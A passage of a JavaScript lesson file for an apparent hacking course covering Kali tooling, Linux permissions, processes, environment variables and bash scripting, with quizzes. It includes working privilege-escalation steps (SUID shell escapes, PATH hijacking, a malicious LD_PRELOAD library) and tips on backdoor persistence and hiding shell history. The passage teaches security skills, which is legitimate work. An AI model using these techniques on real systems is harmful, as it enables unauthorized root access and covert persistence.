      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("apt update")+"<br>"+O("Get:1 http://kali.download/kali kali-rolling InRelease [30.5 kB]<br>Reading package lists... Done<br>Building dependency tree... Done")+"<br>"+P("apt upgrade -y")+"<br>"+O("1101 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.")+"<br>"+P("apt install golang -y")+"<br>"+O("The following NEW packages will be installed: golang golang-1.21<br>Setting up golang-1.21 (1.21.5-1) ...")+"<br>"+P("apt remove --purge metasploit-framework")+"<br>"+COM("# --purge also removes config files, not just binary"))}
      <h3>Searching and Inspecting Packages</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("apt search 'sql injection'")+"<br>"+O("sqlmap/kali-rolling: Automatic SQL injection tool<br>sqlninja/kali-rolling: SQL Server injection and takeover tool")+"<br>"+P("apt show nmap")+"<br>"+O("Package: nmap<br>Version: 7.94+dfsg-4<br>Maintainer: Debian Security Tools<br>Description: The Network Mapper")+"<br>"+P("dpkg -l | grep python3")+"<br>"+COM("# List installed packages matching pattern"))}`
    },
    {
      name:"Managing Repositories",
      content:`<p>Repositories are servers that host packages. Kali's default repos contain hundreds of security tools, but sometimes you need to add third-party repos for cutting-edge or niche tools.</p>
      <h3>Understanding sources.list</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("cat /etc/apt/sources.list")+"<br>"+O("deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware")+"<br>"+P("cat /etc/apt/sources.list.d/")+"<br>"+O("# Additional repo files live here ‚Äî one per source")+"<br>"+P("add-apt-repository ppa:deadsnakes/ppa")+"<br>"+O("Repository: 'deb https://ppa.launchpadcontent.net/deadsnakes/ppa/ubuntu focal main'<br>Adding repository.")+"<br>"+P("wget -qO - https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor | tee /usr/share/keyrings/microsoft.gpg")+"<br>"+COM("# Always import GPG keys to verify package integrity"))}
      ${WARN("REPO TRUST","Adding untrusted repositories can expose you to supply-chain attacks. An attacker controlling a repo could push malicious packages. Only add repos from verified, trusted sources.")}`
    },
    {
      name:"Installing Popular Hacking Tools",
      content:`<p>Beyond what ships with Kali, the security community constantly develops new tools. Knowing how to install from multiple sources is essential.</p>
      <h3>apt, pip, gem, and cargo</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("apt install bloodhound neo4j -y")+"<br>"+O("Setting up neo4j (1:5.14.0) ...<br>Setting up bloodhound (4.3.1-0kali1) ...")+"<br>"+P("pip3 install impacket")+"<br>"+O("Successfully installed impacket-0.11.0")+"<br>"+P("gem install wpscan")+"<br>"+O("Successfully installed wpscan-3.8.24")+"<br>"+P("go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest")+"<br>"+COM("# Go-based tools install to ~/go/bin/"))}
      <h3>Installing from GitHub</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("git clone https://github.com/danielmiessler/SecLists.git /opt/SecLists")+"<br>"+O("Cloning into '/opt/SecLists'...<br>remote: Counting objects: 74,831<br>Receiving objects: 100% (74831/74831), 1.24 GiB")+"<br>"+P("git clone https://github.com/carlospolop/PEASS-ng.git && cd PEASS-ng")+"<br>"+COM("# PEASS-ng: privilege escalation awesome scripts suite"))}`
    },
    {
      name:"Compiling Tools from Source",
      content:`<p>Some tools aren't in repos ‚Äî you must compile from source. This is common with cutting-edge exploits, custom implants, and research tools. It's also essential when cross-compiling payloads.</p>
      <h3>The Build Chain</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("apt install build-essential gcc make cmake -y")+"<br>"+COM("# Install compilation toolchain first")+"<br>"+P("git clone https://github.com/target/tool.git && cd tool")+"<br>"+P("./configure --prefix=/usr/local")+"<br>"+O("checking build system type... x86_64-pc-linux-gnu<br>configure: creating ./Makefile")+"<br>"+P("make -j$(nproc)")+"<br>"+O("gcc -O2 -Wall -o tool src/main.c src/utils.c<br>Linking...")+"<br>"+P("make install")+"<br>"+GR("Install complete: /usr/local/bin/tool"))}
      ${INFO("CROSS-COMPILATION","To compile exploit payloads for Windows from Kali: install <code>mingw-w64</code> then use <code>x86_64-w64-mingw32-gcc exploit.c -o exploit.exe</code>. Essential for generating Windows shellcode.")}`
    },
    {
      name:"Keeping Kali Clean & Optimized",
      content:`<p>A bloated system is a slow system. During long engagements, disk space and performance matter. Regularly maintaining your Kali installation keeps it sharp.</p>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("apt autoremove -y")+"<br>"+O("Removing unneeded packages: libgdbm-compat4 libpopt0<br>After this operation, 47.2 MB disk space will be freed.")+"<br>"+P("apt autoclean")+"<br>"+O("Del python3-dev 3.11.2-1 [28.4 kB]<br>Del gcc-12 12.2.0-14 [72.6 MB]")+"<br>"+P("journalctl --vacuum-size=100M")+"<br>"+O("Vacuuming done, freed 428.7M of archived journals from /var/log/journal.")+"<br>"+P("df -h")+"<br>"+O("Filesystem      Size  Used Avail Use% Mounted on<br>/dev/sda1        50G   18G   30G  38% /")+"<br>"+COM("# 30GB free ‚Äî healthy"))}
      ${TIP("DISK SPACE TIP","Run <code>du -sh /* 2>/dev/null | sort -rh | head -20</code> to find the biggest space consumers on your system. Also check <code>/var/log/</code> ‚Äî logs grow fast.")}`
    }
  ],
  quiz:[
    {q:"apt update does what?",opts:["Installs all updates","Refreshes the package index","Upgrades the OS version","Removes old packages"],ans:1},
    {q:"Which command removes a package AND its config files?",opts:["apt remove","apt delete","apt remove --purge","apt clean"],ans:2},
    {q:"cross-compiling a Windows payload on Kali uses:",opts:["wine gcc","mingw-w64","apt-cross","winecc"],ans:1}
  ]
},
{
  num:5, title:"File Permissions & Privilege Escalation", icon:"üîê",
  desc:"Master chmod, chown, SUID bits, and learn real privilege escalation techniques used in pentests.",
  xp:40,
  lessons:[
    {
      name:"Understanding Linux Permissions",
      content:`<p>Linux permissions control who can read, write, and execute every file and directory. Understanding them deeply is the foundation of privilege escalation ‚Äî one of the most important skills in offensive security.</p>
      <h3>The Permission String Decoded</h3>
      <p>When you run <code>ls -l</code>, you see something like <code>-rwxr-xr--</code>. Every character is meaningful:</p>
      <table><tr><th>Position</th><th>Value</th><th>Meaning</th></tr>
      <tr><td>1</td><td>- or d or l</td><td>File type: regular file, directory, symlink</td></tr>
      <tr><td>2-4</td><td>rwx</td><td>Owner permissions: read, write, execute</td></tr>
      <tr><td>5-7</td><td>r-x</td><td>Group permissions: read, no-write, execute</td></tr>
      <tr><td>8-10</td><td>r--</td><td>Others permissions: read-only</td></tr></table>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("ls -la /etc/shadow")+"<br>"+O("-rw-r----- 1 root shadow 1412 Jan 15 08:00 /etc/shadow")+"<br>"+COM("# owner=root(rw), group=shadow(r), others=(none)")+"<br>"+P("stat /etc/passwd")+"<br>"+O("File: /etc/passwd<br>Access: (0644/-rw-r--r--)  Uid: (    0/    root)  Gid: (    0/    root)"))}`
    },
    {
      name:"chmod & chown ‚Äî Changing Permissions",
      content:`<p>During post-exploitation, you'll need to change permissions to access restricted files, make scripts executable, or configure persistence mechanisms. <code>chmod</code> and <code>chown</code> are your tools.</p>
      <h3>chmod ‚Äî Octal vs Symbolic</h3>
      <table><tr><th>Octal</th><th>Binary</th><th>Symbolic</th><th>Meaning</th></tr>
      <tr><td>7</td><td>111</td><td>rwx</td><td>Full access</td></tr>
      <tr><td>6</td><td>110</td><td>rw-</td><td>Read/write</td></tr>
      <tr><td>5</td><td>101</td><td>r-x</td><td>Read/execute</td></tr>
      <tr><td>4</td><td>100</td><td>r--</td><td>Read only</td></tr>
      <tr><td>0</td><td>000</td><td>---</td><td>No access</td></tr></table>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("chmod 755 exploit.sh")+"<br>"+COM("# rwxr-xr-x ‚Äî owner can do all, others can read/execute")+"<br>"+P("chmod +x reverse_shell.py")+"<br>"+COM("# Add execute for all without changing read/write")+"<br>"+P("chmod 600 ~/.ssh/id_rsa")+"<br>"+COM("# SSH key: owner read/write only ‚Äî required by ssh client")+"<br>"+P("chown root:shadow /etc/shadow")+"<br>"+COM("# Change file owner and group")+"<br>"+P("chown -R www-data:www-data /var/www/html")+"<br>"+COM("# -R applies recursively to all files and subdirs"))}`
    },
    {
      name:"SUID, GUID & Sticky Bit",
      content:`<p>Special permission bits extend the basic rwx model. SUID is the most critical for hackers ‚Äî finding SUID binaries is a standard privilege escalation technique.</p>
      <h3>The SUID Bit ‚Äî Privilege Escalation Vector</h3>
      <p>When SUID is set on an executable, it runs with the <strong>file owner's</strong> permissions, not the caller's. A SUID binary owned by root runs as root regardless of who calls it. This is legitimately used by <code>passwd</code>, <code>sudo</code>, and <code>ping</code> ‚Äî but misconfigured SUID binaries are gold for escalation.</p>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("find / -perm -4000 -type f 2>/dev/null")+"<br>"+GR("/usr/bin/sudo<br>/usr/bin/passwd<br>/usr/bin/pkexec<br>/usr/bin/newgrp<br>/usr/bin/gpasswd<br>/usr/local/bin/custom_backup")+"<br>"+P("ls -la /usr/local/bin/custom_backup")+"<br>"+O("-rwsr-xr-x 1 root root 16584 Jan 10 14:22 /usr/local/bin/custom_backup")+"<br>"+COM("# 's' in owner position = SUID set ‚Äî runs as root!"))}
      <h3>GTFOBins ‚Äî Exploiting Legitimate SUID Binaries</h3>
      <p>GTFOBins (gtfobins.github.io) documents how legitimate binaries can be abused when misconfigured. If <code>find</code>, <code>vim</code>, <code>python</code>, or <code>bash</code> have SUID set, instant root.</p>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",COM("# If python3 has SUID bit set:")+"<br>"+P("python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'")+"<br>"+GR("# sh-5.1# whoami")+"<br>"+GR("# root")+"<br>"+COM("# If find has SUID bit:")+"<br>"+P("find . -exec /bin/sh -p \\; -quit")+"<br>"+GR("# Instant root shell"))}`
    },
    {
      name:"Privilege Escalation Techniques",
      content:`<p>Privilege escalation (privesc) is the act of moving from a low-privilege account to root. In every pentest, after initial access you need to escalate. Here are the core techniques.</p>
      <h3>Kernel Exploits</h3>
      <p>Unpatched kernels contain vulnerabilities that allow unprivileged users to execute code as root. Check the kernel version and compare against exploit databases.</p>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("uname -a")+"<br>"+O("Linux target 4.15.0-20-generic #21-Ubuntu SMP x86_64 GNU/Linux")+"<br>"+COM("# Search: 'Linux 4.15.0 privilege escalation exploit'")+"<br>"+P("searchsploit linux kernel 4.15 privilege escalation")+"<br>"+GR("Linux Kernel < 4.16.9 - 'rds' Local Privilege Escalation | linux/local/44219.c<br>Linux Kernel 4.15.x - 'perf_event_open()' Privilege Escalation | linux/local/44305.c"))}
      <h3>Sudo Misconfigurations</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("sudo -l")+"<br>"+O("User alice may run the following commands:<br>    (ALL) NOPASSWD: /usr/bin/vim<br>    (ALL) NOPASSWD: /usr/bin/find")+"<br>"+COM("# vim with sudo = root:")+"<br>"+P("sudo vim -c ':!/bin/bash'")+"<br>"+GR("root@target:/home/alice# id<br>uid=0(root) gid=0(root) groups=0(root)"))}
      <h3>Automated Enumeration</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh")+"<br>"+P("chmod +x linpeas.sh && ./linpeas.sh 2>/dev/null | tee linpeas_output.txt")+"<br>"+GR("# linPEAS automatically checks 300+ privesc vectors:<br># SUID files, sudo rules, cron jobs, world-writable dirs,<br># weak passwords, kernel exploits, and more"))}`
    },
    {
      name:"umask & Default Permissions",
      content:`<p>The <code>umask</code> (user file creation mask) defines the default permissions for newly created files. Misconfigured umask leads to files being world-readable ‚Äî a common privilege escalation path.</p>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("umask")+"<br>"+O("0022")+"<br>"+COM("# Default: files created with 644, dirs with 755")+"<br>"+COM("# Calculation: 666 (max file) - 022 = 644")+"<br>"+P("umask 077")+"<br>"+COM("# Paranoid mode: files = 600, dirs = 700 ‚Äî only owner can access")+"<br>"+P("echo 'umask 077' >> ~/.bashrc")+"<br>"+COM("# Make it permanent for your hacking session")+"<br>"+P("touch secret_notes.txt && ls -la secret_notes.txt")+"<br>"+O("-rw------- 1 kali kali 0 Jan 15 09:00 secret_notes.txt")+"<br>"+COM("# 600 ‚Äî only you can read it. Good for storing creds."))}
      ${TIP("POST-EXPLOITATION","After compromising a machine, check what umask value the system uses globally. A umask of 0000 or 0002 means newly created files by root may be world-readable ‚Äî great for reading cronjob outputs, temp credential dumps, etc.")}`
    }
  ],
  quiz:[
    {q:"What octal permission is rwxr-xr--?",opts:["755","754","764","744"],ans:1},
    {q:"The SUID bit causes a program to run as:",opts:["The current user","The file's owner","The group owner","Any user"],ans:1},
    {q:"sudo -l reveals:",opts:["Sudo version","What commands the current user can run as root","List of sudo users","Sudo log"],ans:1}
  ]
},
{
  num:6, title:"Process Management", icon:"‚öôÔ∏è",
  desc:"Control processes, manage services with systemd, run background jobs, and understand resource allocation.",
  xp:25,
  lessons:[
    {
      name:"Viewing & Understanding Processes",
      content:`<p>Every running program is a process with a unique PID (Process ID). During a pentest, you need to enumerate processes to understand what's running on a target, find injectable services, and maintain your own tools.</p>
      <h3>ps ‚Äî Process Snapshot</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("ps aux")+"<br>"+O("USER       PID %CPU %MEM    VSZ   RSS TTY   STAT START   TIME COMMAND<br>root         1  0.0  0.3 168952 13456 ?   Ss   08:00   0:03 /sbin/init<br>root       423  0.0  0.1  14484  4312 ?   Ss   08:00   0:00 /usr/sbin/sshd<br>mysql      891  0.2  2.4 1246780 98232 ? Sl  08:01   2:14 /usr/sbin/mysqld<br>www-data  1234  0.0  0.4  428956 17432 ? S   08:05   0:00 /usr/sbin/apache2<br>kali      5421  0.0  0.1  12348  3200 pts/0 Ss 09:14   0:00 bash")+"<br>"+COM("# USER=owner, PID=ID, %CPU/%MEM=resources, COMMAND=what's running"))}
      ${INFO("ENUMERATION TIP","On a compromised system, <code>ps aux | grep -E 'python|ruby|perl|php|java|node'</code> finds web shells, backdoors, and interpreted-language processes that shouldn't be there.")}`
    },
    {
      name:"top, htop & Real-Time Monitoring",
      content:`<p><code>top</code> and <code>htop</code> provide live, continuously updated process views. They're essential for spotting anomalies, resource exhaustion during exploits, and monitoring long-running scans.</p>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("top -b -n 1 | head -20")+"<br>"+O("top - 09:15:01 up 1:14,  1 user,  load average: 0.52, 0.38, 0.29<br>Tasks: 182 total,   1 running, 181 sleeping,   0 stopped<br>%Cpu(s):  5.3 us,  1.2 sy,  0.0 ni, 93.2 id<br>MiB Mem :   7882.7 total,   4521.3 free,   2041.4 used<br><br>  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND<br> 1337 kali      20   0  834256  48320  22400 S  25.0   0.6   0:15.23 msfconsole")+"<br>"+COM("# PID 1337 is consuming 25% CPU ‚Äî likely running a scan")+"<br>"+P("htop")+"<br>"+COM("# htop: color-coded, mouse support, kill by name, sort columns ‚Äî superior to top"))}`
    },
    {
      name:"Killing & Signaling Processes",
      content:`<p>Signals are the Linux IPC mechanism for controlling processes. As a hacker, you'll use them to terminate detection tools, cleanly stop services, or force processes to re-read configs.</p>
      <h3>Signal Types</h3>
      <table><tr><th>Signal</th><th>Number</th><th>Meaning</th><th>Can Catch?</th></tr>
      <tr><td>SIGTERM</td><td>15</td><td>Polite termination request</td><td>Yes</td></tr>
      <tr><td>SIGKILL</td><td>9</td><td>Force kill ‚Äî cannot be ignored</td><td>No</td></tr>
      <tr><td>SIGHUP</td><td>1</td><td>Hang up ‚Äî reload config</td><td>Yes</td></tr>
      <tr><td>SIGINT</td><td>2</td><td>Interrupt (Ctrl+C)</td><td>Yes</td></tr>
      <tr><td>SIGSTOP</td><td>19</td><td>Pause process</td><td>No</td></tr>
      <tr><td>SIGCONT</td><td>18</td><td>Continue paused process</td><td>Yes</td></tr></table>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("kill 5421")+"<br>"+COM("# Sends SIGTERM (15) ‚Äî polite kill")+"<br>"+P("kill -9 5421")+"<br>"+COM("# SIGKILL ‚Äî process is gone immediately, no cleanup")+"<br>"+P("pkill -9 sshd")+"<br>"+COM("# Kill by name ‚Äî kills ALL processes named sshd")+"<br>"+P("killall python3")+"<br>"+COM("# Kill all python3 processes"))}`
    },
    {
      name:"Managing Services with systemd",
      content:`<p>Modern Linux systems use systemd to manage services (daemons). During engagements, you'll start web servers, SSH listeners, databases, and persistence mechanisms using systemctl.</p>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("systemctl status apache2")+"<br>"+GR("‚óè apache2.service - The Apache HTTP Server<br>     Loaded: loaded (/lib/systemd/system/apache2.service)<br>     Active: active (running) since Wed 2025-01-15 08:21:33<br>    Process: 1234 ExecStart=/usr/sbin/apachectl start<br>   Main PID: 1235 (apache2)")+"<br>"+P("systemctl start ssh && systemctl enable ssh")+"<br>"+COM("# start: run now; enable: auto-start on boot")+"<br>"+P("systemctl list-units --type=service --state=running")+"<br>"+O("  UNIT          LOAD   ACTIVE SUB     DESCRIPTION<br>  apache2.service  loaded active running Apache<br>  ssh.service      loaded active running OpenSSH<br>  mysql.service    loaded active running MySQL"))}
      ${TIP("PERSISTENCE","After compromising a box, install a systemd service for persistence: create <code>/etc/systemd/system/backdoor.service</code> pointing to your reverse shell script, then <code>systemctl enable backdoor</code>. It will survive reboots.")}`
    },
    {
      name:"Background Jobs, screen & tmux",
      content:`<p>During long operations ‚Äî scans, password cracking, exfiltration ‚Äî you need processes to run in the background without being tied to your terminal session. <code>screen</code> and <code>tmux</code> are essential.</p>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("nmap -sV 192.168.1.0/24 &")+"<br>"+O("[1] 5891<br># Process running in background")+"<br>"+P("jobs")+"<br>"+O("[1]+ Running   nmap -sV 192.168.1.0/24 &")+"<br>"+P("bg 1")+"<br>"+P("fg 1")+"<br>"+COM("# Bring background job to foreground"))}
      <h3>tmux ‚Äî The Hacker's Terminal Multiplexer</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("tmux new -s engagement")+"<br>"+COM("# Create named session called 'engagement'")+"<br>"+COM("# Inside tmux:")+"<br>"+COM("# Ctrl+B, c  = New window")+"<br>"+COM("# Ctrl+B, %  = Split pane vertically")+"<br>"+COM("# Ctrl+B, d  = Detach session (runs in background)")+"<br>"+P("tmux attach -t engagement")+"<br>"+COM("# Reconnect to session even after SSH disconnect"))}
      ${INFO("PROFESSIONAL USE","Real penetration testers use tmux with named windows per task: Window 1: recon, Window 2: exploitation, Window 3: post-exploitation, Window 4: notes. This keeps the engagement organized and recoverable after connection drops.")}`
    }
  ],
  quiz:[
    {q:"Which signal number force-kills a process?",opts:["15","1","9","2"],ans:2},
    {q:"systemctl enable service does what?",opts:["Starts service immediately","Starts service now and on reboot","Makes service auto-start on boot only","Lists enabled services"],ans:2},
    {q:"What does '&' at the end of a command do?",opts:["Pipe to next command","Run in background","Run as root","Combine two commands"],ans:1}
  ]
},
{
  num:7, title:"Environment Variables", icon:"üîß",
  desc:"Master environment variables, PATH manipulation, shell customization, and stealth configuration.",
  xp:20,
  lessons:[
    {
      name:"Understanding Environment Variables",
      content:`<p>Environment variables are named values available to processes. They configure behavior, point to critical paths, and store session-specific data. Hackers leverage them for tool configuration, privilege escalation, and operational stealth.</p>
      <h3>Viewing Variables</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("env")+"<br>"+O("PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>HOME=/root<br>USER=root<br>SHELL=/bin/bash<br>LANG=en_US.UTF-8<br>TERM=xterm-256color")+"<br>"+P("printenv HOME")+"<br>"+O("/root")+"<br>"+P("echo $USER")+"<br>"+O("root")+"<br>"+P("echo $SHELL")+"<br>"+O("/bin/bash"))}
      ${INFO("OPSEC","When operating on a compromised machine, check <code>env</code> immediately. Database passwords, API keys, and cloud credentials are frequently stored in environment variables by developers who think they're more secure than config files.")}
      <h3>Key Variables Every Hacker Needs to Know</h3>
      <table><tr><th>Variable</th><th>Purpose</th><th>Hacking Relevance</th></tr>
      <tr><td>PATH</td><td>Binary search directories</td><td>PATH hijacking for privesc</td></tr>
      <tr><td>HOME</td><td>Current user's home dir</td><td>Locate .ssh, .bash_history</td></tr>
      <tr><td>LD_PRELOAD</td><td>Pre-loaded shared libraries</td><td>Privesc via library injection</td></tr>
      <tr><td>HISTFILE</td><td>Bash history file location</td><td>Redirect to /dev/null for stealth</td></tr>
      <tr><td>SHLVL</td><td>Shell nesting level</td><td>Detect if you're in a subshell</td></tr></table>`
    },
    {
      name:"Setting & Exporting Variables",
      content:`<p>Variables can be local to the current shell or exported to child processes. Understanding scope is critical for writing reliable scripts and configuring tools.</p>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("TARGET=192.168.1.50")+"<br>"+COM("# Local variable ‚Äî only this shell")+"<br>"+P("bash -c 'echo $TARGET'")+"<br>"+O("")+"<br>"+COM("# Child process can't see it!")+"<br>"+P("export TARGET=192.168.1.50")+"<br>"+P("bash -c 'echo $TARGET'")+"<br>"+O("192.168.1.50")+"<br>"+COM("# Now child processes can see it")+"<br>"+P("export LHOST=10.10.14.5 LPORT=4444")+"<br>"+P("echo \"Listener: ${LHOST}:${LPORT}\"")+"<br>"+GR("Listener: 10.10.14.5:4444"))}`
    },
    {
      name:"PATH Manipulation & Hijacking",
      content:`<p>The PATH variable defines where the shell looks for binaries. PATH hijacking is a privilege escalation technique where you insert a malicious directory earlier in PATH to intercept commands run by root.</p>
      <h3>Adding to PATH</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("echo $PATH")+"<br>"+O("/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin")+"<br>"+P("export PATH=/opt/mytools:$PATH")+"<br>"+P("echo $PATH")+"<br>"+GR("/opt/mytools:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin")+"<br>"+COM("# /opt/mytools searched FIRST ‚Äî our binaries take precedence"))}
      <h3>PATH Hijacking for Privilege Escalation</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",COM("# Scenario: root's crontab runs '/opt/backup.sh' which calls 'tar'")+"<br>"+COM("# We can write to /tmp but not to /usr/bin/tar")+"<br>"+P("echo '#!/bin/bash' > /tmp/tar")+"<br>"+P("echo 'chmod +s /bin/bash' >> /tmp/tar")+"<br>"+P("chmod +x /tmp/tar")+"<br>"+P("export PATH=/tmp:$PATH")+"<br>"+COM("# Wait for cron to run... then:")+"<br>"+P("/bin/bash -p")+"<br>"+GR("bash-5.1# id<br>uid=1001(alice) gid=1001 euid=0(root)")+"<br>"+COM("# SUID bash ‚Äî we are effectively root!"))}
      ${DANGER("ETHICAL WARNING","PATH hijacking is a real attack. Never perform this on systems you don't own or have explicit permission to test. Use practice VMs like HackTheBox or TryHackMe.")}`
    },
    {
      name:"Persistent Variables & Shell Configuration",
      content:`<p>Variables set in the current session are lost on logout. Making them permanent requires editing shell initialization files. Understanding these files also lets you plant persistence via environment manipulation.</p>
      <h3>Shell Init Files</h3>
      <table><tr><th>File</th><th>When Loaded</th><th>Scope</th></tr>
      <tr><td><code>~/.bashrc</code></td><td>Every interactive non-login shell</td><td>Per-user</td></tr>
      <tr><td><code>~/.bash_profile</code></td><td>Login shells</td><td>Per-user</td></tr>
      <tr><td><code>/etc/environment</code></td><td>All users, all sessions</td><td>System-wide</td></tr>
      <tr><td><code>/etc/profile</code></td><td>All users, login shells</td><td>System-wide</td></tr>
      <tr><td><code>/etc/bash.bashrc</code></td><td>All users, interactive</td><td>System-wide</td></tr></table>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("echo 'export HACKTOOLS=/opt/tools' >> ~/.bashrc")+"<br>"+P("echo 'export PATH=$HACKTOOLS:$PATH' >> ~/.bashrc")+"<br>"+P("source ~/.bashrc")+"<br>"+COM("# Changes active immediately in current shell")+"<br>"+P("echo $HACKTOOLS")+"<br>"+O("/opt/tools"))}`
    },
    {
      name:"LD_PRELOAD & Library Injection",
      content:`<p><code>LD_PRELOAD</code> is one of the most powerful ‚Äî and dangerous ‚Äî environment variables. It instructs the dynamic linker to load your specified library before all others, allowing you to override any function in any program.</p>
      <h3>LD_PRELOAD Privilege Escalation</h3>
      <p>If a program can be run with <code>sudo</code> and sudo preserves <code>LD_PRELOAD</code> (a misconfiguration), you can inject a malicious shared library that spawns a root shell.</p>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",COM("# Create malicious shared library:")+"<br>"+P("cat > /tmp/priv.c << 'EOF'")+"<br>"+O("#include &lt;stdio.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;stdlib.h&gt;<br>void _init() {<br>    unsetenv(\"LD_PRELOAD\");<br>    setgid(0); setuid(0);<br>    system(\"/bin/bash\");<br>}<br>EOF")+"<br>"+P("gcc -fPIC -shared -o /tmp/priv.so /tmp/priv.c -nostartfiles")+"<br>"+P("sudo LD_PRELOAD=/tmp/priv.so /usr/bin/find")+"<br>"+GR("root@target:/tmp# id<br>uid=0(root) gid=0(root) groups=0(root)"))}
      ${DANGER("LAB ONLY","This is a critical privilege escalation technique. Only perform in authorized lab environments. Study how it works to also detect and prevent it in production systems.")}`
    }
  ],
  quiz:[
    {q:"Which variable loads a shared library before all others?",opts:["PATH","PRELOAD","LD_PRELOAD","LIBPATH"],ans:2},
    {q:"To make a variable available to child processes use:",opts:["set","local","export","global"],ans:2},
    {q:"PATH hijacking works by inserting a malicious directory:",opts:["At the end of PATH","At the beginning of PATH","In /etc/environment only","Directly in /usr/bin"],ans:1}
  ]
},
{
  num:8, title:"Bash Scripting", icon:"üìú",
  desc:"Build real hacking scripts from scratch: port scanners, automation tools, and reconnaissance pipelines.",
  xp:40,
  lessons:[
    {
      name:"Bash Fundamentals & Script Structure",
      content:`<p>Bash scripting transforms repetitive command sequences into automated, reusable tools. Every professional hacker writes scripts ‚Äî from one-liners to fully featured reconnaissance frameworks.</p>
      <h3>Script Anatomy</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",COM("#!/bin/bash")+"<br>"+COM("# ============================================")+"<br>"+COM("# Script: recon.sh")+"<br>"+COM("# Author: HackPath Academy")+"<br>"+COM("# Usage: ./recon.sh <target_ip>")+"<br>"+COM("# ============================================")+"<br>"+P("cat recon.sh")+"<br>"+O("#!/bin/bash<br>set -euo pipefail  # strict mode: exit on error<br><br>TARGET=$1<br>OUTDIR=\"./recon_${TARGET}\"<br>mkdir -p $OUTDIR<br>echo \"[*] Starting recon on $TARGET\"<br>echo \"[*] Output directory: $OUTDIR\"")+"<br>"+P("chmod +x recon.sh && ./recon.sh 192.168.1.50")+"<br>"+GR("[*] Starting recon on 192.168.1.50<br>[*] Output directory: ./recon_192.168.1.50"))}`
    },
    {
      name:"Variables, Input & Conditionals",
      content:`<p>Variables, user input, and conditional logic are the building blocks of useful scripts. Without them, you have static commands ‚Äî with them, you have adaptive tools.</p>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("cat vars_demo.sh")+"<br>"+O("#!/bin/bash<br># Variables<br>NAME=\"HackPath\"<br>VERSION=3<br>echo \"$NAME v${VERSION}\"<br><br># User input<br>read -p 'Enter target IP: ' TARGET<br>read -sp 'Enter password: ' PASS  # -s = silent<br>echo<br><br># Conditionals<br>if [[ -z \"$TARGET\" ]]; then<br>    echo 'ERROR: No target specified'<br>    exit 1<br>fi<br><br>if ping -c1 -W1 $TARGET &>/dev/null; then<br>    echo \"[+] $TARGET is alive\"<br>else<br>    echo \"[-] $TARGET is down or filtered\"<br>fi")+"<br>"+P("./vars_demo.sh")+"<br>"+O("HackPath v3<br>Enter target IP: 192.168.1.1<br>Enter password: <br>[+] 192.168.1.1 is alive"))}`
    },
    {
      name:"Loops ‚Äî Automating at Scale",
      content:`<p>Loops are what make scripting powerful for hacking. Password spraying, subnet scanning, directory brute forcing ‚Äî all are loops at their core.</p>
      <h3>for, while, and until Loops</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("cat subnet_ping.sh")+"<br>"+O("#!/bin/bash<br>SUBNET=$1<br>echo '[*] Scanning subnet for live hosts...'<br><br>for i in $(seq 1 254); do<br>    IP=\"${SUBNET}.${i}\"<br>    if ping -c1 -W0.5 $IP &>/dev/null; then<br>        echo \"[ALIVE] $IP\"<br>    fi<br>done &amp;&amp; echo '[*] Scan complete'")+"<br>"+P("./subnet_ping.sh 192.168.1")+"<br>"+GR("[*] Scanning subnet for live hosts...<br>[ALIVE] 192.168.1.1<br>[ALIVE] 192.168.1.10<br>[ALIVE] 192.168.1.50<br>[ALIVE] 192.168.1.101<br>[*] Scan complete"))}`
    },
    {
      name:"Functions & Script Organization",
      content:`<p>Functions make scripts readable, reusable, and maintainable. Professional tools organize logic into functions ‚Äî use the same pattern in your scripts.</p>
